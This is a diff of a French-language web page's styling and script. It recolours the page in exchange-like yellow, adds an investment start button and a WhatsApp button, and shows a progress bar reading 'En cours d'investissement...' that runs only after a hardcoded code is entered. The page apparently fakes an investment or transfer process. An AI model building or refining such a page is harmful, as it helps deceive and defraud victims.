@@ -23,9 +23,7 @@
         }
 
         body {
-            background-color: #000000;
-            margin: 0;
-            padding: 0;
+            background-color: #000000; /* Fond sombre pour le texte */
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -38,8 +36,8 @@
         .interface {
             text-align: center;
             padding: 20px;
-            background-color: rgba(255, 255, 255, 0.5); 
-            color: #000000;
+            background-color: rgba(255, 255, 255, 0.7); /* Augmenter l'opacité */
+            color: #14151A; /* Couleur du texte */
             border-radius: 30px;
             box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
             margin-top: 20px;
@@ -51,7 +49,6 @@
         .transfer-text {
             font-size: 16px;
             margin-bottom: 5px;
-            text-align: center;
             display: block;
         }
 
@@ -69,7 +66,7 @@
         .progress {
             height: 100%;
             width: 0;
-            background-color: #2980b9;
+            background-color: #F0B90B; /* Couleur de la barre de progression */
             border-radius: 10px;
             position: absolute;
             top: 0;
@@ -84,11 +81,12 @@
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 2; 
+            color: #000; /* Couleur du texte dans la barre de progression */
         }
 
         .button {
-            background-color: #4da6e6;
-            color: #ffffff;
+            background-color: #F0B90B; /* Couleur du bouton "Démarrer l'investissement" */
+            color: #14151A; /* Couleur du texte du bouton */
             border: none;
             padding: 10px 20px;
             border-radius: 5px;
@@ -99,11 +97,11 @@
         }
 
         .button:hover {
-            background-color: #368ec4;
+            background-color: #d1a000; /* Couleur au survol */
         }
 
         .whatsapp-button {
-            background-color: #25D366;
+            background-color: #25D366; /* Couleur du bouton WhatsApp */
             color: #ffffff;
             border: none;
             padding: 10px 20px;
@@ -115,7 +113,7 @@
         }
 
         .whatsapp-button:hover {
-            background-color: #1DA851;
+            background-color: #1DA851; /* Couleur au survol du bouton WhatsApp */
         }
 
         .top-left-image {
@@ -165,7 +163,7 @@
         `;
 
         document.querySelector('#btn-deblock').addEventListener('click', () => {
-            let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
+            let code2 = prompt("Veuillez entrer le code de suivi de votre investissement");
             if (code2 == "2021") {
                 interval = setInterval(progress, 750);
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
